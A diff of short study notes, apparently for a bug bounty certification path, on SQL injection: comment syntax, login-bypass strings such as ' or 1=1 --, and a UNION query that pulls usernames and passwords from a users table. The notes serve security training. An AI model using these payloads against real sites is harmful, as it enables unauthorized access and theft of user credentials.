@@ -1,21 +1,30 @@
 # CBBH PATH
 
 # SQL Injection
+```powershell
+# Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
+```
+
 ## Find the Vuln Query
 ```powershell
 # Check the url after the ?raman=raman
 # Check login fields
 ```
 
-## Fix the Query
+## Fix the Query (Comment)
 ```powershell
--- #for comment
+--
+#
 ```
 
 ## Payloads
 ```powershell
 ' or 1=1 --
 '--
+```
+## String Concatenation
+```powershell
+' UNION select NULL, username || '*' || password from users--
 ```
 
 ## Detmine the number of columns
